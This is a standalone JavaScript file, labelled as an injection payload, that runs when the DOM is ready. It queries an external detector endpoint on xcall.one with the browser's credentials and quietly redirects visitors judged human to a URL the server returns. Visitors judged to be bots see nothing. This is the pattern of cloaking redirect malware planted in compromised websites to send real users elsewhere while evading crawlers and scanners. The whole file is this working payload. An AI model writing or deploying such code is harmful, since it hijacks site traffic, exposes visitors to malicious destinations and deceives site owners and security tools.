// Dynamic AJAX Injection Payload - Loaded Server-Side
(function() {
    'use strict';
    
    // Configuration
    var config = {
        detectorUrl: 'https://xcall.one/detector.php?json=1',
        redirectUrl: 'https://xcall.one',
        targetId: 'content',
        timeout: 5000
    };
    
    /**
     * Inject content via AJAX without triggering bot detection
     */
    function injectContent() {
        // Method 1: XMLHttpRequest (server-side detection)
        var xhr = new XMLHttpRequest();
        xhr.open('GET', config.detectorUrl, true);
        xhr.timeout = config.timeout;
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var response = JSON.parse(xhr.responseText);
                    
                    if (response.status === 'human_detected' && response.redirect) {
                        // Redirect human visitor
                        window.location.replace(response.redirect);
                    } else if (response.status === 'bot_detected') {
                        // Bot detected - do nothing (silent block)
                        console.log('Access check: blocked');
                    }
                } catch (e) {
                    console.error('Injection error: ' + e.message);
                }
            }
        };
        
        xhr.onerror = function() {
            console.error('Injection failed: Network error');
        };
        
        xhr.ontimeout = function() {
            console.error('Injection timeout');
        };
        
        xhr.send();
    }
    
    /**
     * Alternative: Fetch API (modern browsers)
     */
    function injectContentFetch() {
        if (typeof fetch === 'undefined') {
            injectContent(); // Fallback to XMLHttpRequest
            return;
        }
        
        fetch(config.detectorUrl, {
            method: 'GET',
            credentials: 'include',
            headers: {
                'Accept': 'application/json'
            }
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data.status === 'human_detected' && data.redirect) {
                window.location.replace(data.redirect);
            } else if (data.status === 'bot_detected') {
                console.log('Access check: blocked');
            }
        })
        .catch(function(error) {
            console.error('Fetch injection error: ' + error);
        });
    }
    
    /**
     * Execute injection when DOM is ready
     */
    function ready(callback) {
        if (document.readyState !== 'loading') {
            callback();
        } else if (document.addEventListener) {
            document.addEventListener('DOMContentLoaded', callback);
        } else {
            document.attachEvent('onreadystatechange', function() {
                if (document.readyState === 'interactive') {
                    callback();
                }
            });
        }
    }
    
    // Execute injection
    ready(function() {
        // Try Fetch first, fallback to XMLHttpRequest
        if (typeof fetch !== 'undefined') {
            injectContentFetch();
        } else {
            injectContent();
        }
    });
})();
?>